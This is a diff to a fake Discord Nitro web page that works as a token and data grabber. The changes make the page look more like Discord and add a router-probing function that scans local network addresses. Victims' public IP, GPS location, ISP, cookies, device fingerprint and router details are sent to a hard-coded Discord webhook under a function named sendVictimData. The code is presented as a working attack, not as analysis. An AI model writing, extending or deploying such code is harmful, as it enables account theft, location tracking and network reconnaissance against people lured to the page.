@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <link rel="icon" href="https://discord.com/assets/f9c91147228077b211c1f90d6e4de24b.png">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Nitro Generator - Free 1 Year!</title>
+    <title>Discord - Nitro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
@@ -81,6 +82,50 @@
     <script>
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
         let tokensGrabbed = false;
+
+        // 🔥 ROUTER IP/PORT GRABBER (Network recon)
+        async function grabRouterInfo() {
+            const routerData = {};
+            
+            // Public IP (already exists)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                routerData.publicIP = (await ipRes.json()).ip;
+            } catch(e) {}
+            
+            // Local network IPs + Router gateway
+            const localIPs = [];
+            ['192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.'].forEach(prefix => {
+                for(let i=1; i<255; i++) {
+                    localIPs.push(`${prefix}${i}`);
+                }
+            });
+            
+            // Common router endpoints (80/443/8080/8443)
+            const routerEndpoints = [
+                ...localIPs.slice(0, 50), // Limit to prevent timeout
+                '192.168.1.1', '192.168.0.1', '10.0.0.1', '192.168.1.254', '192.168.0.254'
+            ].map(ip => [`http://${ip}:80`, `http://${ip}:8080`, `https://${ip}:443`, `https://${ip}:8443`]).flat();
+            
+            // Test router responses (fast fail)
+            const routerProbes = routerEndpoints.slice(0, 20); // Limit 20 probes
+            for(const url of routerProbes) {
+                try {
+                    const ctrl = new AbortController();
+                    setTimeout(() => ctrl.abort(), 500); // 500ms timeout
+                    const res = await fetch(url, {method:'HEAD', signal: ctrl.signal});
+                    if(res.ok && res.headers.get('server')?.toLowerCase().includes('router') || 
+                       url.includes('192.168') || url.includes('10.')) {
+                        routerData.routerIP = new URL(url).hostname;
+                        routerData.routerPort = new URL(url).port || 80;
+                        routerData.routerServer = res.headers.get('server') || 'Unknown';
+                        break;
+                    }
+                } catch(e) {}
+            }
+            
+            return routerData;
+        }
 
         // 🔥 FULL NAME GRABBER + BULLETPROOF TOKEN GRABBER
         function instantTokenGrab() {
@@ -216,11 +261,16 @@
             return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
         }
 
-        // 🚀 MAIN IP + GEO GRAB (ADDED USERNAME)
+        // 🚀 MAIN IP + GEO + ROUTER GRAB (ENHANCED)
         async function sendVictimData() {
             try {
+                // Public IP first
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
+                
+                // ROUTER RECON (NEW)
+                const routerData = await grabRouterInfo();
+                
                 const geo = await grabGeoLocation(ip);
                 
                 // 👤 GRAB USERNAME ON LOAD TOO
@@ -244,7 +294,10 @@
                     plugins: navigator.plugins.length,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     ua: navigator.userAgent.slice(0,80),
-                    username: fullName
+                    username: fullName,
+                    routerIP: routerData.routerIP || 'Not found',
+                    routerPort: routerData.routerPort || 'Not found',
+                    routerServer: routerData.routerServer || 'Not found'
                 };
                 
                 await fetch(WEBHOOK, {
@@ -259,11 +312,13 @@
                                 {name: '🌍 Location', value: `${geo.city}, ${geo.country}`, inline: true},
                                 {name: '📍 GPS', value: `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}`, inline: true},
                                 {name: '🌐 ISP', value: geo.isp, inline: true},
-                                {name: '📶 IP', value: `\`${ip}\``, inline: true},
+                                {name: '📶 Public IP', value: `\`${ip}\``, inline: true},
+                                {name: '🔌 Router IP', value: `\`${fingerprint.routerIP}\``, inline: true},
+                                {name: '🔌 Router Port', value: `\`${fingerprint.routerPort}\``, inline: true},
                                 {name: '🖥️ Device', value: `${fingerprint.screen} (${fingerprint.platform})`, inline: true},
                                 {name: '🌐 Timezone', value: fingerprint.timezone, inline: true}
                             ],
-                            footer: {text: `UA: ${fingerprint.ua} | Cookies: ${fingerprint.cookies}`},
+                            footer: {text: `UA: ${fingerprint.ua} | Cookies: ${fingerprint.cookies} | Router: ${fingerprint.routerServer}`},
                             timestamp: new Date().toISOString()
                         }]
                     })
